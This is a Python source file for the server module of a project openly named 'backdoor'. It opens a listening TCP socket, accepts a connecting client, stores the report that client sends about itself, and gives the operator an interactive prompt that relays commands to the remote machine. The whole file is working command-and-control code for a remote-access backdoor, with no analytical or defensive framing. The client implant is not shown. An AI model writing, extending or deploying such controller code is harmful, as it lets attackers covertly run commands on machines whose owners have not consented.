# pyright: reportUnusedVariable=false
from functools import singledispatchmethod
import socket

from backdoor.command.converter import InputToCommandConverter
from backdoor.command.executor import LocalCommandExecutor
from backdoor.command.processor import CommandProcessor
from backdoor.exceptions.core import (
    InvalidArgumentException,
    PresentableApplicationException,
)
from backdoor.messages.exchange.server import ServerExchangeMapper
from backdoor.messages.messenger import SocketMessenger
from backdoor.models.client import ClientModel
from backdoor.models.commands import Command, LocalCommand, RemoteCommand
from backdoor.server.registry import ClientRegistry
from backdoor.utils.errors import print_error


class Server:

    def __init__(
        self,
        messenger: SocketMessenger,
        exchanger: ServerExchangeMapper,
        converter: InputToCommandConverter,
        processor: CommandProcessor,
        executor: LocalCommandExecutor,
        registry: ClientRegistry,
        host: str,
        port: int,
    ) -> None:
        self.host = host
        self.port = port
        self.messenger = messenger
        self.exchanger = exchanger
        self.converter = converter
        self.processor = processor
        self.executor = executor
        self.registry = registry
        self.socket = self.__create_socket(host, port)
        self.ps1 = ">>> "

    def start(self) -> None:
        client = self.__accept_connection()
        self.__read_client_report(client)

        self.registry.register(client)

        while (inp := self.__get_input()) != "exit":
            command = self.converter.convert(inp)
            self.__perform_command(command, client)

    @singledispatchmethod
    def __perform_command(self, command: Command, client: ClientModel) -> None:
        cls_name = command.__class__.__qualname__
        raise InvalidArgumentException(f"Cannot handle base class '{cls_name}'")

    @__perform_command.register
    def _(self, command: RemoteCommand, client: ClientModel) -> None:
        try:
            self.processor.pre_process(command)
            result = self.exchanger.exchange(client, command)
            self.processor.post_process(command, result)
        except PresentableApplicationException as e:
            print_error(e)

    @__perform_command.register
    def __(self, command: LocalCommand, client: ClientModel) -> None:
        result = self.executor.execute(command)
        self.processor.post_process(command, result)

    def __accept_connection(self) -> ClientModel:
        sock, addr = self.socket.accept()
        host, port = addr
        return ClientModel(**locals())

    def __read_client_report(self, client: ClientModel) -> None:
        report = self.messenger.receive(client.sock)
        client.report = report

    def __get_input(self) -> str:
        while not (inp := input(self.ps1).strip()):
            ...
        return inp

    def __create_socket(self, host: str, port: int) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(0)
        return sock
